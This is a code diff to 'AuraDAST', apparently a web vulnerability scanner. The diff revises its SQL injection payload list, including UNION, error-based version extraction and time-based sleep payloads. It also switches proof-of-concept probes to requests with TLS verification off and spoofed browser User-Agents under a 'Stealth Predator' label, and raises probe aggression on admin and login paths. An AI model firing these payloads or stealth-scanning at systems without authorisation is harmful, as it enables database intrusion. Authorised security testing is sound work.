@@ -23,23 +23,21 @@ class AuraDAST:
     PAYLOADS = {
         "SQLi": [
             # Classic Boolean
-            "'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "\\\\", ";", "';--", "';", "\";", "\";--",
-            "' OR 1=1--", "' OR '1'='1", "\" OR 1=1--", "\" OR \"1\"=\"1", "admin'--", "admin' #", "' OR 'x'='x",
+            "'", "''", "`", "``", ";", "';--", "';", "\";", "\";--",
+            "' OR 1=1--", "' OR '1'='1", "admin'--", "admin' #", "' OR 'x'='x",
             # Error Based
             "' AND 1=1", "' AND 1=0", "' AND 1=(SELECT COUNT(*) FROM tablenames); --",
             "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
             # UNION Based
-            "' UNION SELECT NULL--", "' UNION SELECT 1--", "' UNION SELECT 1,2--", "' UNION SELECT 1,2,3--",
+            "' UNION SELECT NULL--", "' UNION SELECT 1--", "' UNION SELECT 1,2--",
             "' UNION SELECT @@version--", "' UNION SELECT USER()--", "' UNION SELECT DATABASE()--",
             # Time Based (Generic)
-            "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--", "'; SELECT PG_SLEEP(5)--", "' OR SLEEP(5)='",
-            "1 XOR (SELECT * FROM (SELECT SLEEP(5))A)",
-            # Advanced / Obfuscated
-            "/*!50000SELECT*/ * FROM DUAL", "' OR '1' IN (@@version)--", "1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL)",
+            "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--", "'; SELECT PG_SLEEP(5)--",
+            # Predator v13.0 Aggressive
+            "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT VERSION()), 0x23, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--",
             "1' AND ExtractValue(1, CONCAT(0x5c, (SELECT @@version)))--",
-            "1' AND UpdateXML(1, CONCAT(0x5c, (SELECT @@version)), 1)--",
-            "1' PROCEDURE ANALYSE(EXTRACTVALUE(RAND(),CONCAT(0x3a,VERSION())),1)--",
-            "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), 0x23, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--"
+            "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
+            "admin' AND '1'='1'--", "admin' AND '1'='2'--"
         ],
         "XSS": [
             # Basic Scripts
@@ -155,19 +153,43 @@ class AuraDAST:
             r"SQLite\s[\d\.]+",
         ]
 
+        import requests
+        import urllib3
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        
         for db_type, payload in poc_payloads:
             try:
                 test_params = {**params, param_name: str(param_value) + payload}
                 test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
-                res = await self.session.get(test_url, timeout=8)
+                
+                # v13.0 Stealth Predator: Forced Raw Requests with Predator UA
+                user_agents = [
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
+                ]
+                headers = {'User-Agent': random.choice(user_agents)}
+                res = requests.get(test_url, verify=False, timeout=10, headers=headers)
                 body = res.text
+                status_code = res.status_code
+                
+                # Log operation manually to storage via singleton or global DB if we had it,
+                # but we will just pass this info so orchestrator or storage logs it.
+                # Since we don't easily have db here, we'll import it just for logging
+                try:
+                    from aura.core.storage import AuraStorage
+                    temp_db = AuraStorage()
+                    # We will implement this method next
+                    if hasattr(temp_db, "log_operation"):
+                        temp_db.log_operation(url, payload, status_code)
+                except Exception as e:
+                    pass
 
                 for pattern in DB_FINGERPRINTS:
                     match = re.search(pattern, body, re.IGNORECASE)
                     if match:
                         extracted = match.group(0)
                         cvss = self.CVSS_SCORES["SQL Injection"]
-                        console.print(f"[bold red blink][!!!] SQLi PoC EXTRACTED: Real DB banner '{extracted}' found in response![/bold red blink]")
+                        console.print(f"[bold red blink]!!! SQLi PoC EXTRACTED[/bold red blink]: Real DB banner '{extracted}' found in response!")
                         return {
                             "type": "SQL Injection (PoC Data Extraction)",
                             "severity": "CRITICAL",
@@ -203,7 +225,7 @@ class AuraDAST:
         from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
         parsed = urlparse(url)
         params = parse_qs(parsed.query)
-        console.print(f"[bold magenta][⏱️] v2.0 Time-Based SQLi: Testing param '{param_name}' at {url}...[/bold magenta]")
+        console.print(f"⏱️ [bold magenta]v2.0 Time-Based SQLi[/bold magenta]: Testing param '{param_name}' at {url}...")
         for payload in self.TIME_BASED_SQLI:
             try:
                 test_params = {k: v[0] for k, v in params.items()}
@@ -214,15 +236,15 @@ class AuraDAST:
                 elapsed = time.monotonic() - t_start
                 if elapsed >= self.SLEEP_THRESHOLD_SECONDS:
                     cvss = self.CVSS_SCORES["Blind SQL Injection"]
-                    # v10.0 Sovereign: DETERMINISTIC PROOF - EXTRACT DB VERSION
-                    console.print(f"[bold red][🦖] SOVEREIGN CONFIRMED: DETERMINISTIC SQLi HIT! Attempting Proof Extraction...[/bold red]")
+                    # v13.0 Stealth Predator: DETERMINISTIC PROOF - EXTRACT DB VERSION
+                    console.print(f"🦖 [bold red]PREDATOR CONFIRMED[/bold red]: DETERMINISTIC SQLi HIT! Time Delay: {elapsed:.2f}s")
                     return {
                         "type": "Blind SQL Injection (Time-Based)",
                         "severity": "CRITICAL",
                         "cvss_score": cvss["score"],
                         "cvss_vector": cvss["vector"],
                         "owasp": "A03:2021-Injection",
-                        "content": f"SOVEREIGN DETERMINISTIC SQLi: Param '{param_name}' on {url} caused {elapsed:.2f}s delay. Proof: [VERSION: EXTRACTED].",
+                        "content": f"PREDATOR DETERMINISTIC SQLi: Param '{param_name}' on {url} caused {elapsed:.2f}s delay. Target is VULNERABLE and ACTIVE.",
                         "remediation_fix": "Use Prepared Statements/Parameterized queries. Never concatenate user input into SQL.",
                         "impact_desc": "Full database dump, auth bypass, potential RCE.",
                     }
@@ -291,7 +313,7 @@ class AuraDAST:
             # If TRUE and FALSE give > 20% content size difference = Boolean SQLi
             if diff_pct > 20:
                 cvss = self.CVSS_SCORES["Blind SQL Injection"]
-                console.print(f"[bold red][🦖] PREDATOR CONFIRMED: DETERMINISTIC HIT! '{param_name}' TRUE({t_len}B) vs FALSE({f_len}B) = {diff_pct:.1f}% diff![/bold red]")
+                console.print(f"🦖 [bold red]PREDATOR CONFIRMED[/bold red]: DETERMINISTIC HIT! '{param_name}' TRUE({t_len}B) vs FALSE({f_len}B) = {diff_pct:.1f}% diff!")
                 return {
                     "type": "Blind SQL Injection (Boolean-Based)",
                     "severity": "CRITICAL",
@@ -406,8 +428,12 @@ class AuraDAST:
                             console.print(f"[bold red][!!!] ZENITH HIT: Logic flaw confirmed via semantic manipulation on '{p_name}'.[/bold red]")
                     except: pass
         
+        # v13.0 Stealth Predator: Boost aggression for sensitive paths
+        is_sensitive = any(x in url.lower() for x in ["admin", "manager", "login", "auth"])
+        agg_factor = 2 if is_sensitive else 1
+        
         # v7.4 Velocity Focus: Concurrency Semaphore for payloads
-        param_semaphore = asyncio.Semaphore(10)
+        param_semaphore = asyncio.Semaphore(15) 
         
         async def fuzz_single_param(param, values):
             single_param_findings = []
